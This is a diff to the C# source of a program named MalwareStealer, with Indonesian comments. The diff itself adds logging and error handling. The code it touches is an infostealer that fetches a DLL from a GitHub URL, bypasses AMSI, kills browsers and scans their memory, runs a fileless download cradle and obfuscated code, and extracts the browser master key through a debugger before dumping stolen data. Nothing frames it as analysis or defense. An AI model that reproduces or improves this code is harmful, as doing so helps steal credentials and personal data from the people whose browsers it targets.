@@ -112,19 +112,36 @@ namespace MalwareStealer
                 if (assemblyName == "System.Data.SQLite")
                 {
                     string dllPath = Path.Combine(Path.GetTempPath(), "System.Data.SQLite.dll");
+                    
+                    // CEK APAKAH DLL SUDAH ADA
                     if (!File.Exists(dllPath))
                     {
                         try
                         {
+                            Console.WriteLine("[+] Downloading System.Data.SQLite.dll from GitHub...");
                             using (var client = new WebClient())
                             {
                                 client.DownloadFile("https://raw.githubusercontent.com/dailam008/stealer/main/System.Data.SQLite.dll", dllPath);
                             }
+                            Console.WriteLine("[+] Download complete: " + dllPath);
                         }
-                        catch { return null; }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("[-] Failed to download DLL: " + ex.Message);
+                            return null;
+                        }
                     }
-                    byte[] assemblyBytes = File.ReadAllBytes(dllPath);
-                    return Assembly.Load(assemblyBytes);
+                    
+                    try
+                    {
+                        byte[] assemblyBytes = File.ReadAllBytes(dllPath);
+                        return Assembly.Load(assemblyBytes);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[-] Failed to load DLL: " + ex.Message);
+                        return null;
+                    }
                 }
                 return null;
             };
@@ -147,7 +164,7 @@ namespace MalwareStealer
             catch { Console.WriteLine("[-] AMSI Bypass Failed!"); }
         }
 
-        // ===== KILL BROWSER (FALLBACK) =====
+        // ===== KILL BROWSER =====
         static void KillBrowsers()
         {
             Console.WriteLine("[+] Menutup browser...");
@@ -167,7 +184,7 @@ namespace MalwareStealer
             Thread.Sleep(2000);
         }
 
-        // ===== SCAN SELURUH MEMORY UNTUK STRING =====
+        // ===== SCAN MEMORY =====
         static IntPtr FindStringInModule(IntPtr hProcess, IntPtr moduleBase, int moduleSize, string target)
         {
             byte[] buffer = new byte[moduleSize];
@@ -189,7 +206,7 @@ namespace MalwareStealer
             return IntPtr.Zero;
         }
 
-        // ===== SCAN .TEXT SECTION UNTUK LEA =====
+        // ===== SCAN .TEXT =====
         static IntPtr FindLEAByScan(IntPtr hProcess, IntPtr textBase, int textSize, IntPtr targetAddr)
         {
             byte[] buffer = new byte[textSize];
@@ -515,7 +532,7 @@ namespace MalwareStealer
             }
         }
 
-        // ===== DUMP DATA (FINAL - PASTI KELUAR) =====
+        // ===== DUMP DATA =====
         static void DumpData(byte[] masterKey)
         {
             try
@@ -643,13 +660,9 @@ namespace MalwareStealer
         // ===== MAIN =====
         static void Main()
         {
-            // 1. SETUP DLL RESOLVER (DOWNLOAD OTOMATIS DARI GITHUB)
             SetupDLLResolver();
-
-            // 2. DUMP DATA LANGSUNG DI AWAL (PASTI KELUAR)
             DumpData(null);
 
-            // 3. MODUL 4: FILELESS EXECUTION
             BypassAMSI();
             Console.WriteLine("[+] Malware Stealer Aktif!");
             Console.WriteLine("[+] Modul 4: Fileless Execution");
@@ -658,7 +671,6 @@ namespace MalwareStealer
             ExecuteDownloadCradle(githubUrl);
             ExecuteObfuscated();
             
-            // 4. DEBUGGER BYPASS
             byte[] masterKey = null;
             Console.WriteLine("[+] Mencoba debugger bypass...");
             masterKey = ExtractMasterKeyViaDebugger();
@@ -679,7 +691,6 @@ namespace MalwareStealer
                 Console.WriteLine("[-] Gagal Dapat Master Key. Menggunakan hash fallback.");
             }
 
-            // 5. DUMP DATA KEDUA (PAKE MASTER KEY KALO DAPET)
             DumpData(masterKey);
         }
     }
